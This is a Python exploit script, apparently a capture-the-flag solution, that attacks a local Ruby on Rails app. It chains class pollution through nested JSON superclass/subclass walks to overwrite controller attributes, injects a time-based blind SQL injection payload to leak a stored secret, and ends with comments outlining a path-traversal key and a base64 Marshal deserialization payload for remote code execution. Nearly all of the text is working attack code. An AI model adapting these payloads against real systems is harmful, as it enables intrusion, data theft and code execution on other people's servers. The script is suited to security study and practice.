import requests
import random
import time
import json
import string

BASE_URL = "http://localhost:3000/"
 
def log(msg):
    print("")
    print("#### [Log]: ####"+ msg)
    print("")

def register() -> str:
    # Generate random printable username
    username = ''.join(random.choices("abcdefghijklmnopqrstuvxyz", k=10))
    log(f"Generated username: {username}")
    url = 'https:/winters0x64.xyz/'+username # Constraint to set validation as true.
    data = {
        'username': username,
        'url': url,
        'commit': 'Register'
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    response = requests.post(BASE_URL + 'register', headers=headers, data=data)
    set_cookie = response.headers.get('Set-Cookie', '')
    for part in set_cookie.split(';'):
        if part.strip().startswith('_sfs_session='):
            print("Session Cookie: ",part.strip())
            return part.strip()
    log("Registration Error")
    return None


def validate(sess_cookie:str):
    # Used to load the HealthCheck class to ObjectSpace as the latest additon to ApplicationController subclasses
    headers = {
        'Cookie': sess_cookie,
    }
    res = requests.get(BASE_URL+'validate', headers=headers)

def visit_settings(sess_cookie:str):
    headers = {
        'Cookie': sess_cookie,
    }
    requests.get(BASE_URL+'settings', headers=headers)


def send_file_with_json(pollute_object, file_path, sess_cookie):
    try:
        if isinstance(pollute_object, dict):
            json_data = json.dumps(pollute_object)
        else:
            json_data = json.dumps(pollute_object) if pollute_object else "{}"
            json.loads(json_data)  
    except (ValueError, TypeError) as e:
        log(f"Invalid JSON for pollute_object: {e}")
        return None

    with open(file_path, 'rb') as f:
        files = {
            'file': f
        }
        data = {
            'json_data': json_data
        }
        headers = {
            'Cookie': sess_cookie,
        }

        response = requests.post(BASE_URL + 'settings', files=files, data=data, headers=headers)
        return response


def pollute_admin_url(sess_cookie:str):
    # Unique identification chain
    # AbstractController::Base => ActionController::Metal => ActionController::Base => ApplicationController => HealthcheckController => admin_url
    final_walk = {"first":{"subclasses":{"first":{"subclasses":{"first":{"subclasses":{"first":{"subclasses":{"first":{"admin_url":"http://localhost:3000/qwe"}}}}}}}}}}

    rotate_chains = {"rotate":final_walk}

    # Object_Instance => Setting => ApplicationRecord => ActiveRecord::Base => Object
    pollute_object = {"class":{"superclass":{"superclass":{"superclass":{"subclasses":rotate_chains}}}}}

    # Start the chains
    for i in range(100):
        log(f"Trying {i} rotates")
        res = send_file_with_json(pollute_object,'load_command.rb',sess_cookie)
        rotate_chains = {"rotate":rotate_chains}
        pollute_object = {"class":{"superclass":{"superclass":{"superclass":{"subclasses":rotate_chains}}}}}

def pollute_admin_username(sess_cookie:str, to_test:str):
    # Unique identification chain
    # AbstractController::Base => ActionController::Metal => ActionController::Base => ApplicationController => HealthcheckController => admin_username
    final_walk = {"first":{"subclasses":{"first":{"subclasses":{"first":{"subclasses":{"first":{"subclasses":{"first":{"admin_username":f"' OR (SELECT EXISTS ( SELECT 1 FROM legacies WHERE legacy_secret LIKE '{to_test}%'))) --"}}}}}}}}}}

    rotate_chains = {"rotate":final_walk}

    # Object_Instance => Setting => ApplicationRecord => ActiveRecord::Base => Object
    pollute_object = {"class":{"superclass":{"superclass":{"superclass":{"subclasses":rotate_chains}}}}}

    # Start the chains
    for i in range(100):
        log(f"Trying {i} rotates")
        res = send_file_with_json(pollute_object,'load_command.rb',sess_cookie)
        rotate_chains = {"rotate":rotate_chains}
        pollute_object = {"class":{"superclass":{"superclass":{"superclass":{"subclasses":rotate_chains}}}}}

def exploit_sqli(sess_cookie:str):
    to_test = "fake_"
    leaked = ""
    log("Polluting admin_username")
    pollute_admin_username(sess_cookie, to_test)
    start_time = time.time()
    response = requests.get(BASE_URL+'health')
    end_time = time.time()
    duration = end_time - start_time
    if duration > 2:
        leaked = to_test
        log("Leaked: "+to_test)
    else:
        log("Not Found")
    return leaked

if __name__ == "__main__":
    sess_cookie = register()
    log("Registration successful...")
    #1 After registration => [RegisterController]
    visit_settings(sess_cookie)
    log("Visiting settings controller successful...")
    #2 After visiting settings controller [SettingsController, RegisterController]
    validate(sess_cookie)
    log("Visiting validate controller successful...")
    #3 After validating [HealthcheckController, ValidateController, SettingsController, RegisterController]
    time.sleep(1)
    # Starting class pollution
    log("Polluting admin_url")
    pollute_admin_url(sess_cookie)
    # Starting class pollution + SQLI
    legacy_cookie = exploit_sqli(sess_cookie)
    print("Leaked Cookie: "+ legacy_cookie)
    # After leaking the secret we should move on to exploiting the legacy controller
    # upload RCE file, load_command.rb and then give this value as a key
    # key => ../../../../../../../../../../app/internal_uploads/load
    # string => BAhvOhhHZW06OkNvbW1hbmRNYW5hZ2VyBjoOQGNvbW1hbmRzewY6PC4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2FwcC9pbnRlcm5hbF91cGxvYWRzL2xvYWRG
    # BOOM RCE